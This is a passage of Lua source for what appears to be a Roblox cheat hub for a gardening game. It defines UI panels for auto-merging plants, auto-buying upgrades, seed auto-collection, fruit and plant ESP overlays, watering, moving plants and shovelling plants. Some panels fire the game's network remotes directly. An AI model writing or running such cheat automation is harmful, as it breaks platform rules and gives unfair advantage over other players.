				local d = type(G) == "table" and (type(G.IsPlantReady) == "function" and G.IsPlantReady(i) == true)
				local u = d and "Ready" or "Growing"
				local q = d and "#7CFC00" or "#FFCC66"
				local g = # Z > 8 and Z:sub(- 8) or Z
				J[# J + 1] = {
					Text = string.format("%s <font color=\'%s\'>%s</font> <font color=\'#888888\'>%s</font>", T, q, u, g);
					Value = Z;
					Ready = d;
					Name = T
				}
			end
			table.sort(J, function(G, V)
				if G.Ready ~= V.Ready then
					return G.Ready
				end
				if G.Name ~= V.Name then
					return G.Name < V.Name
				end
				return G.Value < V.Value
			end)
			return J
		end
		local function H()
			local G = E()
			local V = u
			if G then
				V = "\240\159\140\152 Merge Selected \226\134\146 " .. G
			end
			J:SetText(V)
		end
		local function r()
			j:SetValues(a(nil))
			i:SetValues(a(j.Value))
			H()
		end
		c:AddLabel({
			Text = "Only valid merge plants are shown. Growth status is displayed beside each plant.";
			DoesWrap = true
		})
		j = c:AddValueDropdown("plant_merge_first_ui", {
			Values = {},
			Default = nil;
			Multi = false;
			Searchable = true;
			MaxVisibleDropdownItems = d,
			Text = "\240\159\140\177 Plant A";
			Tooltip = "Select the first plant.",
			Callback = r
		})
		i = c:AddValueDropdown("plant_merge_second_ui", {
			Values = {},
			Default = nil,
			Multi = false;
			Searchable = true;
			MaxVisibleDropdownItems = d;
			Text = "\240\159\140\177 Plant B",
			Tooltip = "Only plants compatible with Plant A are shown.";
			Callback = H
		})
		c:AddButton({
			Text = "\240\159\148\132 Reload Plants";
			Tooltip = "Refreshes available plants and growth status.";
			Func = r
		})
		J = c:AddButton({
			Text = u,
			Tooltip = "Merges the selected fully grown plants.";
			Func = function()
				if T then
					return
				end
				local V, Z, c, d, u = E()
				if not V then
					g.Notify("Select two plants from a valid merge recipe", 3)
					return
				end
				if Z.IsPotted == true or c.IsPotted == true then
					g.Notify("Potted plants cannot be merged", 3)
					return
				end
				if type(G) ~= "table" or type(G.IsPlantReady) ~= "function" or not G.IsPlantReady(Z) or not G.IsPlantReady(c) then
					g.Notify("Both selected plants must be fully grown", 3)
					return
				end
				local q = y.Networking and (y.Networking.Garden and y.Networking.Garden.RequestMerge)
				if not q or type(q.Fire) ~= "function" then
					g.Notify("Plant merging is unavailable", 3)
					return
				end
				T = true
				J:SetDisabled(true)
				local a, r, Y = pcall(q.Fire, q, d, u)
				T = false
				J:SetDisabled(false)
				Y = tostring(Y or "")
				if not a then
					Y = "Merge request failed"
				end
				if a and (r ~= true and Y == "") then
					Y = "Merge rejected"
				end
				if a and (r == true and Y == "") then
					Y = "Merge started: " .. V
				end
				g.Notify(Y, 4)
				if a and r == true then
					j:SetValue(nil, true)
					i:SetValue(nil, true)
				end
				H()
			end
		})
		r()
	end
	if T then
		local G
		local V
		local y = false
		local j = false
		local function i(G)
			local V = Z.GardenItems.PetMaxInventorySystem.GetMaximumUpgradePetMaxInventorySystem()
			if V <= 0 then
				return "\240\159\144\190 Max Upgrades (Unavailable)"
			end
			local y = math.clamp(math.floor(tonumber(G) or h.auto_expand_pet_inventory_max_upgrade or 1), 1, V)
			return string.format("\240\159\144\190 Max Upgrades (%d/%d)", y, V)
		end
		local function c(V)
			if not G then
				return
			end
			y = true
			G:SetValue(tostring(V))
			G:SetText(i(V))
			y = false
		end
		local function J(G)
			local V = tonumber(G)
			if not V then
				V = E.Currency.ParseMoney(tostring(G or h.pet_inventory_min_sheckles or 0))
			end
			V = math.max(tonumber(V) or 0, 0)
			return "\240\159\146\176 Keep Min Sheckles: " .. E.Currency.FormatMoney(V)
		end
		local function d(G)
			if not V then
				return
			end
			j = true
			V:SetValue(E.Currency.FormatMoney(G))
			V:SetText(J(G))
			j = false
		end
		local u = Z.GardenItems.PetMaxInventorySystem.GetMaximumUpgradePetMaxInventorySystem()
		local q = Z.GardenItems.PetMaxInventorySystem.GetNextPricePetMaxInventorySystem(Z.GardenItems.PetMaxInventorySystem.GetBaseMaxPetMaxInventorySystem()) or 200000
		T:AddLabel({
			Text = string.format("Starts at <font color=\'#7CFC00\'>1/%d</font>. First upgrade is <font color=\'#00FF00\'>$%s</font>.", math.max(u, 1), E.Currency.FormatMoney(q));
			DoesWrap = true
		})
		G = T:AddInput("auto_expand_pet_inventory_max_upgrade_ui", {
			Text = i(h.auto_expand_pet_inventory_max_upgrade),
			Default = tostring(h.auto_expand_pet_inventory_max_upgrade);
			Numeric = true;
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "1 to 3";
			Tooltip = "Press Enter to set how many pet slot upgrades to buy.";
			Callback = function(G)
				if y then
					return
				end
				local V = Z.GardenItems.PetMaxInventorySystem.GetMaximumUpgradePetMaxInventorySystem()
				local j = z(G)
				if not j or j < 1 or j > V then
					g.Notify("Pet upgrades must be between 1 and " .. tostring(V), 3)
					c(h.auto_expand_pet_inventory_max_upgrade)
					return
				end
				h.auto_expand_pet_inventory_max_upgrade = j
				c(j)
				a.Save.SaveData()
			end
		})
		T:AddToggle("auto_expand_pet_inventory_enabled_ui", {
			Text = "\240\159\144\190 Enable Auto Pet Slots";
			Default = h.auto_expand_pet_inventory,
			Tooltip = "Automatically buys pet slot upgrades when affordable.",
			Callback = function(G)
				h.auto_expand_pet_inventory = G == true
				if not G then
					g.PetMaxInventoryStatusText = ""
				end
				a.Save.SaveData()
			end
		})
		T:AddToggle("pet_inventory_min_sheckles_enabled_ui", {
			Text = "\240\159\146\176 Enable Sheckles Reserve";
			Default = h.pet_inventory_min_sheckles_enabled == true,
			Tooltip = "Keeps this much money saved before buying pet slots.";
			Callback = function(G)
				h.pet_inventory_min_sheckles_enabled = G == true
				a.Save.SaveData()
			end
		})
		V = T:AddInput("pet_inventory_min_sheckles_ui", {
			Text = J(h.pet_inventory_min_sheckles),
			Default = E.Currency.FormatMoney(h.pet_inventory_min_sheckles);
			Numeric = false,
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "0 or 2m";
			Tooltip = "Press Enter to update. 0 disables the amount check.",
			Changed = function(G)
				if j then
					return
				end
				V:SetText(J(G))
			end;
			Callback = function(G)
				if j then
					return
				end
				local V = (tostring(G or "")):match("^%s*(.-)%s*$") or ""
				local y = V == "" and 0 or E.Currency.ParseMoney(V)
				if not y or y < 0 then
					g.Notify("Invalid sheckles amount", 3)
					d(h.pet_inventory_min_sheckles)
					return
				end
				h.pet_inventory_min_sheckles = math.floor(y)
				d(h.pet_inventory_min_sheckles)
				a.Save.SaveData()
			end
		})
	end
	if J then
		local G
		G = J:AddInput("auto_expand_garden_max_slot_ui", {
			Text = "\240\159\143\161 Maximum Slot";
			Default = tostring(h.auto_expand_garden_max_slot);
			Numeric = true,
			AllowEmpty = false;
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "Maximum expansion slot";
			Tooltip = "Stops purchasing when the selected garden slot is reached.";
			Callback = function(V)
				local y = z(V)
				local j = Z.GardenItems.ExpandSystem.GetMaximumSlot()
				if not y or y < 1 or y > j then
					g.Notify("Garden slot must be between 1 and " .. j, 3)
					G:SetValue(tostring(h.auto_expand_garden_max_slot))
					return
				end
				h.auto_expand_garden_max_slot = y
				a.Save.SaveDataSync()
			end
		})
		J:AddToggle("auto_expand_garden_enabled_ui", {
			Text = "\240\159\143\161 Enable Auto Expand",
			Default = h.auto_expand_garden;
			Tooltip = "Automatically purchases affordable garden expansions.",
			Callback = function(G)
				h.auto_expand_garden = G
				if not G then
					g.GardenExpandStatusText = ""
				end
				a.Save.SaveDataSync()
			end
		})
	end
	if V then
		V:AddToggle("garden_items_use_player_walk_ui", {
			Text = "\240\159\154\182 Use Player Walk",
			Default = h.garden_items_use_player_walk;
			Tooltip = "Walks to seeds first, then snaps when close.";
			Callback = function(G)
				h.garden_items_use_player_walk = G
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("auto_collect_drop_seeds", {
			Text = "\240\159\140\177 Auto Collect Dropped Seeds",
			Default = h.auto_collect_drop_seeds,
			Tooltip = "Collects seeds dropped by your pets or player.";
			Callback = function(G)
				h.auto_collect_drop_seeds = G
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("garden_items_auto_collect_event_seeds", {
			Text = "\240\159\140\136 Auto Collect Gold & Rainbow Seeds";
			Default = h.auto_collect_event_seeds;
			Tooltip = "Collects Gold and Rainbow seeds dropped by the event.";
			Callback = function(G)
				h.auto_collect_event_seeds = G
				a.Save.SaveDataSync()
			end
		})
	end
end
g.PlantsUi = function()
	local G = d:AddTab({
		Name = "Plants";
		Description = "Plant automation",
		Icon = "sprout"
	})
	local V = G:AddLeftGroupbox("Shovel Fruits", "shovel")
	local y = G:AddRightGroupbox("<font color=\'#FF5555\'>\226\154\160\239\184\143 Shovel Plants</font>", "triangle-alert")
	local j = G:AddLeftGroupbox("Move Plants", "move")
	local i = G:AddRightGroupbox("Water Plants", "droplets")
	local c = G:AddRightGroupbox("Mutation Seed Placer", "dna")
	local J = G:AddRightGroupbox("Plants/Fruit ESP", "eye")
	local u = G:AddLeftGroupbox("Backpack ESP", "badge-dollar-sign")
	local q = G:AddLeftGroupbox("Auto Fruit Favourites", "star")
	local H = G:AddLeftGroupbox("Manual Fruit Favourites", "mouse-pointer-click")
	if u then
		u:AddToggle("backpack_fruit_price_esp_enabled_ui", {
			Text = "\240\159\146\176 Fruit Slot Prices";
			Default = h.backpack_fruit_price_esp_enabled,
			Tooltip = "Shows the live fruit price at the top of each fruit slot.";
			Callback = function(G)
				h.backpack_fruit_price_esp_enabled = G == true
				if h.backpack_fruit_price_esp_enabled then
					Z.BackpackFruitPriceEsp.StartBackpackFruitPriceEsp()
				else
					Z.BackpackFruitPriceEsp.ClearLabelsBackpackFruitPriceEsp()
				end
				a.Save.SaveData()
			end
		})
		u:AddToggle("backpack_fruit_total_value_esp_enabled_ui", {
			Text = "\240\159\146\142 Inventory Total Value";
			Default = h.backpack_fruit_total_value_esp_enabled;
			Tooltip = "Shows total estimated value of all fruits in your inventory.",
			Callback = function(G)
				h.backpack_fruit_total_value_esp_enabled = G == true
				if h.backpack_fruit_total_value_esp_enabled then
					Z.BackpackFruitPriceEsp.StartBackpackFruitPriceEsp()
					Z.BackpackFruitPriceEsp.RefreshTotalValueBackpackFruitPriceEsp()
				else
					Z.BackpackFruitPriceEsp.ClearTotalLabelBackpackFruitPriceEsp()
				end
				a.Save.SaveData()
			end
		})
		u:AddButton({
			Text = "\240\159\148\132 Refresh Prices";
			Func = function()
				if Z.BuySelectFruit and type(Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit) == "function" then
					Z.BuySelectFruit.EnsureFruitStockReadyBuySelectFruit(true)
				end
				Z.BackpackFruitPriceEsp.RefreshBackpackFruitPriceEsp()
				Z.BackpackFruitPriceEsp.RefreshTotalValueBackpackFruitPriceEsp()
			end
		})
	end
	local r
	r = function(G, V, y)
		if not G or type(y) ~= "table" then
			return nil
		end
		local j
		j = G:AddValueDropdown(V .. "_names_ui", {
			Values = {},
			Default = {},
			Multi = true;
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\141\137 Fruits";
			Tooltip = "No selection matches every fruit.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h[y.names] = G
				a.Save.SaveData()
			end
		})
		j:SetValues(Z.SeedData.GetSeedDataListDropDown())
		j:SetValue(h[y.names])
		local i = G:AddButton({
			Text = "\226\156\133 All";
			Func = function()
				h[y.names] = {}
				for G, V in ipairs(g.AllSeedsDataTable or {}) do
					if type(V) == "table" and type(V.name) == "string" then
						h[y.names][V.name] = true
					end
				end
				j:SetValue(h[y.names])
				a.Save.SaveData()
			end
		})
		i:AddButton({
			Text = "\240\159\167\185 Clear";
			Func = function()
				h[y.names] = {}
				j:SetValue({})
				a.Save.SaveData()
			end
		})
		local c
		c = G:AddInput(V .. "_min_kg_ui", {
			Text = "\226\154\150\239\184\143 Min KG",
			Default = tostring(h[y.minKg]);
			Numeric = true,
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "0",
			Tooltip = "Only fruits at or above this KG.";
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Min KG must be 0 or above", 3)
					c:SetValue(tostring(h[y.minKg]))
					return
				end
				h[y.minKg] = Z.FruitFilters.RoundWeight(V)
				a.Save.SaveData()
			end
		})
		local J
		J = G:AddInput(V .. "_max_kg_ui", {
			Text = "\226\154\150\239\184\143 Max KG",
			Default = tostring(h[y.maxKg]);
			Numeric = true,
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "100000000",
			Tooltip = "Only fruits at or below this KG.";
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Max KG must be 0 or above", 3)
					J:SetValue(tostring(h[y.maxKg]))
					return
				end
				h[y.maxKg] = Z.FruitFilters.RoundWeight(V)
				a.Save.SaveData()
			end
		})
		local T
		T = G:AddValueDropdown(V .. "_mutations_ui", {
			Values = Z.FruitFilters.GetMutationNames();
			Default = {};
			Multi = true,
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\167\172 Mutations";
			Tooltip = "No selection matches every mutation.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h[y.mutations] = G
				a.Save.SaveData()
			end
		})
		T:SetValue(h[y.mutations])
		local d
		d = G:AddValueDropdown(V .. "_variants_ui", {
			Values = Z.FruitFilters.GetVariantNames(),
			Default = {};
			Multi = true,
			Searchable = false,
			MaxVisibleDropdownItems = 5;
			Text = "\240\159\140\136 Variants";
			Tooltip = "No selection matches every variant.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h[y.variants] = G
				a.Save.SaveData()
			end
		})
		d:SetValue(h[y.variants])
		local u
		u = G:AddInput(V .. "_max_value_ui", {
			Text = "\240\159\146\176 Max Value",
			Default = tostring(h[y.maxValue]);
			Numeric = false,
			AllowEmpty = true;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "0 = ignore";
			Tooltip = "Only fruits at or below this value. Use 0 to ignore.";
			Callback = function(G)
				local V = E.Currency.ParseMoney(tostring(G or "0"))
				if V < 0 then
					g.Notify("Max value must be 0 or more", 3)
					u:SetValue(tostring(h[y.maxValue]))
					return
				end
				h[y.maxValue] = math.floor(V)
				u:SetText("\240\159\146\176 Max Value: " .. ((V > 0 and "$" .. Z.BackpackFruitPriceEsp.FormatPriceBackpackFruitPriceEsp(V) or "Ignored")))
				a.Save.SaveData()
			end
		})
		u:SetText("\240\159\146\176 Max Value: " .. ((((tonumber(h[y.maxValue]) or 0)) > 0 and "$" .. Z.BackpackFruitPriceEsp.FormatPriceBackpackFruitPriceEsp(h[y.maxValue]) or "Ignored")))
		return true
	end
	if q then
		q:AddLabel({
			Text = "Automatically favourites fruits matching the auto filters before seller runs.";
			DoesWrap = true
		})
		r(q, "auto_fruit_favourite", {
			names = "auto_fruit_favourite_names";
			minKg = "auto_fruit_favourite_min_kg",
			maxKg = "auto_fruit_favourite_max_kg";
			mutations = "auto_fruit_favourite_mutations",
			variants = "auto_fruit_favourite_variants";
			maxValue = "auto_fruit_favourite_max_value"
		})
		q:AddDivider()
		q:AddToggle("auto_fruit_favourite_enabled_ui", {
			Text = "\226\173\144 Auto Favourite",
			Default = h.auto_fruit_favourite_enabled,
			Tooltip = "Favourites fruits that match the auto filters.",
			Callback = function(G)
				h.auto_fruit_favourite_enabled = G == true
				if not G then
					Z.FruitFavouriteManager.SetStatusAutoFruitFavouriteManager("")
				end
				a.Save.SaveData()
			end
		})
		q:AddButton({
			Text = "\226\154\161 Run Auto Favourite Now",
			Func = function()
				Z.FruitFavouriteManager.RunAutoFavouriteFruitFavouriteManager()
			end
		})
	end
	if H then
		H:AddLabel({
			Text = "Manual favourite tools use their own filters and run only when you press a button.",
			DoesWrap = true
		})
		r(H, "manual_fruit_favourite", {
			names = "manual_fruit_favourite_names",
			minKg = "manual_fruit_favourite_min_kg";
			maxKg = "manual_fruit_favourite_max_kg",
			mutations = "manual_fruit_favourite_mutations",
			variants = "manual_fruit_favourite_variants";
			maxValue = "manual_fruit_favourite_max_value"
		})
		H:AddDivider()
		H:AddButton({
			Text = "\226\173\144 Favourite Matching Now",
			Func = function()
				Z.FruitFavouriteManager.RunManualFavouriteFruitFavouriteManager(true)
			end
		})
		H:AddButton({
			Text = "\226\157\140 Unfavourite Matching Now";
			Func = function()
				Z.FruitFavouriteManager.RunManualFavouriteFruitFavouriteManager(false)
			end
		})
	end
	if c and (Z.MutationSeedPlacer and type(Z.MutationSeedPlacer.UiMutationSeedPlacer) == "function") then
		Z.MutationSeedPlacer.UiMutationSeedPlacer(c)
	end
	if J then
		g.PlantFruitEspUi.StatusLabel = J:AddLabel({
			Text = g.PlantFruitEspStatusText ~= "" and g.PlantFruitEspStatusText or "<font color=\'#888888\'>ESP idle</font>",
			DoesWrap = true
		})
		J:AddLabel({
			Text = "Small ESP labels for fruits and plants. Fruit labels use kg range; plant labels show length.";
			DoesWrap = true
		})
		J:AddToggle("live_plants_board_enabled_ui", {
			Text = "\240\159\147\139 Show Live Plants",
			Default = false,
			Tooltip = "Shows live data for the selected plant names during this session only.";
			Callback = function(G)
				g.LivePlantsBoardEnabled = G == true
				Z.LivePlantsBoard.RefreshLivePlantsBoard()
			end
		})
		local G
		G = J:AddValueDropdown("plant_fruit_esp_names_ui", {
			Values = {};
			Default = {},
			Multi = true;
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\140\177 Plant / Fruit Names",
			Tooltip = "No selection shows every ESP label. Select names to use the live board.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.plant_fruit_esp_names = G
				a.Save.SaveData()
				Z.LivePlantsBoard.RefreshLivePlantsBoard()
			end
		})
		G:SetValues(Z.SeedData.GetSeedDataListDropDown())
		G:SetValue(h.plant_fruit_esp_names)
		local V = J:AddButton({
			Text = "\226\156\133 All",
			Func = function()
				h.plant_fruit_esp_names = Z.PlantFruitEsp.GetAllNameSelectionPlantFruitEsp()
				G:SetValue(h.plant_fruit_esp_names)
				a.Save.SaveData()
				Z.LivePlantsBoard.RefreshLivePlantsBoard()
			end
		})
		V:AddButton({
			Text = "\240\159\167\185 Clear";
			Func = function()
				h.plant_fruit_esp_names = {}
				G:SetValue({})
				a.Save.SaveData()
				Z.LivePlantsBoard.RefreshLivePlantsBoard()
			end
		})
		J:AddButton({
			Text = "\240\159\148\132 Reload Names",
			Func = function()
				G:SetValues(Z.SeedData.GetSeedDataListDropDown())
				G:SetValue(h.plant_fruit_esp_names)
				Z.LivePlantsBoard.RefreshLivePlantsBoard()
				g.Notify("ESP names refreshed", 2)
			end
		})
		J:AddDivider()
		local y
		y = J:AddInput("plant_fruit_esp_min_kg_ui", {
			Text = "\226\172\135\239\184\143 Minimum KG",
			Default = tostring(h.plant_fruit_esp_min_kg);
			Numeric = true,
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "0",
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Minimum KG must be 0 or more", 3)
					y:SetValue(tostring(h.plant_fruit_esp_min_kg))
					return
				end
				if V > ((tonumber(h.plant_fruit_esp_max_kg) or 1000000000)) then
					g.Notify("Minimum KG must be lower than maximum KG", 3)
					y:SetValue(tostring(h.plant_fruit_esp_min_kg))
					return
				end
				h.plant_fruit_esp_min_kg = V
				a.Save.SaveData()
			end
		})
		local j
		j = J:AddInput("plant_fruit_esp_max_kg_ui", {
			Text = "\226\172\134\239\184\143 Maximum KG";
			Default = tostring(h.plant_fruit_esp_max_kg),
			Numeric = true;
			AllowEmpty = true;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "999999",
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Maximum KG must be 0 or more", 3)
					j:SetValue(tostring(h.plant_fruit_esp_max_kg))
					return
				end
				if V < ((tonumber(h.plant_fruit_esp_min_kg) or 0)) then
					g.Notify("Maximum KG must be higher than minimum KG", 3)
					j:SetValue(tostring(h.plant_fruit_esp_max_kg))
					return
				end
				h.plant_fruit_esp_max_kg = V
				a.Save.SaveData()
			end
		})
		local i
		i = J:AddInput("plant_fruit_esp_max_distance_ui", {
			Text = "\240\159\147\143 Max Distance";
			Default = tostring(h.plant_fruit_esp_max_distance),
			Numeric = true,
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "250",
			Callback = function(G)
				local V = z(G)
				if not V or V < 25 then
					g.Notify("Max distance must be 25 or more", 3)
					i:SetValue(tostring(h.plant_fruit_esp_max_distance))
					return
				end
				h.plant_fruit_esp_max_distance = V
				a.Save.SaveData()
			end
		})
		J:AddDivider()
		J:AddToggle("plant_fruit_esp_fruit_enabled_ui", {
			Text = "\240\159\141\137 Fruit KG ESP";
			Default = h.plant_fruit_esp_fruit_enabled,
			Tooltip = "Shows small kg labels on fruits that match the filters.",
			Callback = function(G)
				h.plant_fruit_esp_fruit_enabled = G == true
				a.Save.SaveData()
			end
		})
		J:AddToggle("plant_fruit_esp_plant_enabled_ui", {
			Text = "\240\159\140\177 Plant Length ESP",
			Default = h.plant_fruit_esp_plant_enabled,
			Tooltip = "Shows small length labels on plants that match the selected names.";
			Callback = function(G)
				h.plant_fruit_esp_plant_enabled = G == true
				a.Save.SaveData()
			end
		})
	end
	if i then
		local G
		G = i:AddValueDropdown("water_plant_selected_cans_ui", {
			Values = {};
			Default = {},
			Multi = true,
			Searchable = true,
			MaxVisibleDropdownItems = 6,
			Text = "\240\159\146\167 Watering Cans",
			Tooltip = "Select watering cans to use. No selection uses any available can.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.water_plant_selected_cans = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.WaterPlants.GetCanDropdown())
		G:SetValue(h.water_plant_selected_cans)
		local V
		V = i:AddDropdown("water_plant_mode_ui", {
			Values = Z.Farm.GetPlacementModeOptionsFarm(true, {
				"Growing Plant"
			}, {
				"Plant Target";
				"Custom Position"
			}),
			Default = h.water_plant_mode;
			Multi = false,
			Text = "\240\159\147\141 Water Target";
			Tooltip = "Choose where the watering can should be used.",
			Callback = function(G)
				if type(G) ~= "string" or G == "" then
					return
				end
				h.water_plant_mode = G
				a.Save.SaveDataSync()
			end
		})
		V:SetValue(h.water_plant_mode)
		local y
		y = i:AddValueDropdown("water_plant_target_plant_ui", {
			Values = {};
			Default = "",
			Multi = false,
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\140\177 Target Plant",
			Tooltip = "Plant Target mode waters any plant of this type.";
			Changed = function(G)
				if type(G) ~= "string" then
					return
				end
				h.water_plant_target_plant = G
				a.Save.SaveDataSync()
			end
		})
		y:SetValues(Z.SeedData.GetSeedDataListDropDown())
		y:SetValue(h.water_plant_target_plant)
		local j = i:AddLabel({
			Text = Z.WaterPlants.GetSavedPositionText();
			DoesWrap = true
		})
		i:AddButton({
			Text = "\240\159\147\140 Copy Current Position",
			Tooltip = "Stand inside your farm where the watering can should be used.",
			Func = function()
				local G, y = Z.WaterPlants.SaveCurrentPosition()
				g.Notify(y, 3)
				if G then
					h.water_plant_mode = "Custom Position"
					V:SetValue("Custom Position")
					j:SetText(Z.WaterPlants.GetSavedPositionText())
					a.Save.SaveDataSync()
				end
			end
		})
		i:AddDivider()
		local c
		c = i:AddValueDropdown("water_plant_weather_selected_ui", {
			Values = Z.WeatherTriggers.GetDropdownWeatherTriggers();
			Default = {};
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 8;
			Text = "\240\159\140\166\239\184\143 Weather Trigger";
			Tooltip = "No selection allows any weather.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.water_plant_weather_selected = G
				a.Save.SaveData()
			end
		})
		c:SetValue(h.water_plant_weather_selected)
		i:AddToggle("water_plant_weather_enabled_ui", {
			Text = "\240\159\140\166\239\184\143 Use Weather Trigger",
			Default = h.water_plant_weather_enabled;
			Tooltip = "Only waters plants during selected weather or time cycle.";
			Callback = function(G)
				h.water_plant_weather_enabled = G == true
				a.Save.SaveData()
			end
		})
		i:AddDivider()
		local J
		J = i:AddInput("water_plant_delay_ui", {
			Text = "\226\143\177\239\184\143 Use Delay";
			Default = tostring(h.water_plant_delay);
			Numeric = true,
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "0";
			Tooltip = "Seconds to wait before watering again. 0 disables this delay.";
			Callback = function(G)
				local V = tonumber(G)
				if not V or V < 0 then
					g.Notify("Water delay must be 0 or higher", 3)
					J:SetValue(tostring(h.water_plant_delay))
					return
				end
				h.water_plant_delay = V
				if V <= 0 and h.water_plant_wait_effect ~= true then
					Z.WaterPlants.NextUseAt = 0
				end
				a.Save.SaveDataSync()
			end
		})
		i:AddToggle("water_plant_wait_effect_ui", {
			Text = "\226\143\179 Wait for Effect";
			Default = h.water_plant_wait_effect;
			Tooltip = "Waits for the watering effect to finish. Disable to stack watering effects.",
			Callback = function(G)
				h.water_plant_wait_effect = G
				if not G then
					Z.WaterPlants.NextUseAt = 0
				end
				a.Save.SaveDataSync()
			end
		})
		i:AddToggle("auto_water_plants_ui", {
			Text = "\240\159\146\167 Enable Water Plants";
			Default = h.auto_water_plants,
			Tooltip = "Automatically uses watering cans at the selected target.",
			Callback = function(G)
				h.auto_water_plants = G
				if not G then
					Z.WaterPlants.CleanupTool()
					Z.WaterPlants.ClearStatus()
				end
				a.Save.SaveDataSync()
			end
		})
	end
	if j then
		j:AddLabel({
			Text = "\240\159\147\141 Moves selected plants to one position. No selection means all plants.";
			DoesWrap = true
		})
		local G
		G = j:AddValueDropdown("trowel_plant_types_ui", {
			Values = {},
			Default = {};
			Multi = true;
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\140\177 Plant Types",
			Tooltip = "Selected plants will be moved. No selection moves all plants.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.trowel_plant_types = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.SeedData.GetSeedDataListDropDown())
		G:SetValue(h.trowel_plant_types)
		local V = j:AddButton({
			Text = "\226\156\133 All";
			Func = function()
				h.trowel_plant_types = Z.Trowel.GetAllSelection()
				G:SetValue(h.trowel_plant_types)
				a.Save.SaveDataSync()
			end
		})
		V:AddButton({
			Text = "\240\159\167\185 Clear";
			Func = function()
				h.trowel_plant_types = {}
				G:SetValue({})
				a.Save.SaveDataSync()
			end
		})
		j:AddDivider()
		local y = "Saved Position"
		if h.trowel_use_fixed_spot == true then
			y = tostring(h.trowel_fixed_placement or "")
			if not Z.Farm.IsPlacementModeFarm(y) then
				y = W.UseDefault
			end
		end
		local i = j:AddDropdown("trowel_placement_mode_ui", {
			Values = Z.Farm.GetPlacementModeOptionsFarm(true, nil, {
				"Saved Position"
			}),
			Default = y,
			Multi = false,
			Text = "\240\159\147\141 Move Target";
			Tooltip = "Choose where selected plants are moved.",
			Callback = function(G)
				if G == "Saved Position" then
					h.trowel_use_fixed_spot = false
				elseif Z.Farm.IsPlacementModeFarm(G) then
					h.trowel_use_fixed_spot = true
					h.trowel_fixed_placement = G
				else
					return
				end
				a.Save.SaveDataSync()
			end
		})
		i:SetValue(y)
		local c = j:AddLabel({
			Text = Z.Trowel.GetSavedPositionText(),
			DoesWrap = true
		})
		j:AddButton({
			Text = "\240\159\147\141 Copy Current Position",
			Tooltip = "Stand inside either plant area before saving.",
			Func = function()
				local G, V = Z.Trowel.SavePlayerPosition()
				if G then
					c:SetText(Z.Trowel.GetSavedPositionText())
					g.Notify("Position saved: " .. tostring(V), 3)
				else
					g.Notify(V, 3)
				end
			end
		})
		j:AddDivider()
		j:AddToggle("auto_trowel_plants_ui", {
			Text = "\240\159\147\141 Enable Move Plants",
			Default = h.auto_trowel_plants,
			Tooltip = "Continuously moves selected plants to the target position.";
			Callback = function(G)
				h.auto_trowel_plants = G == true
				if not h.auto_trowel_plants then
					g.TrowelRunning = false
					Z.Player.UnequipTools()
					Z.Trowel.ClearStatus()
				end
				a.Save.SaveDataSync()
			end
		})
	end
	if y then
		y:AddLabel({
			Text = "\240\159\154\168 <font color=\'#FF5555\'><b>DANGER:</b></font> This removes the entire plant and every fruit attached to it. <font color=\'#FF5555\'><b>This cannot be undone.</b></font>";
			DoesWrap = true
		})
		y:AddLabel({
			Text = "Single-harvest plants are excluded. The keep amount applies separately to every selected plant type.",
			DoesWrap = true
		})
		y:AddDivider()
		local G
		G = y:AddValueDropdown("shovel_plant_types_ui", {
			Values = {},
			Default = {};
			Multi = true;
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\140\177 Plant Type",
			Tooltip = "Select plant types that may be permanently removed.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.shovel_plant_types = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.PlantShovel.GetPlantTypeDropdown())
		G:SetValue(h.shovel_plant_types)
		local V = y:AddButton({
			Text = "\226\156\133 <font color=\'#7CFF8A\'><b>All</b></font>",
			Func = function()
				local V = Z.PlantShovel.GetAllPlantTypeSelection()
				h.shovel_plant_types = V
				G:SetValue(V)
				a.Save.SaveDataSync()
			end
		})
		V:AddButton({
			Text = "\240\159\167\185 <font color=\'#FFB86B\'><b>Clear</b></font>",
			Func = function()
				h.shovel_plant_types = {}
				G:SetValue({})
				a.Save.SaveDataSync()
			end
		})
		y:AddButton({
			Text = "\240\159\148\132 Reload Plant Counts";
			Tooltip = "Refreshes the current plant amounts shown in the dropdown.";
			Func = function()
				G:SetValues(Z.PlantShovel.GetPlantTypeDropdown())
				G:SetValue(h.shovel_plant_types)
				g.Notify("Plant counts refreshed", 2)
			end
		})
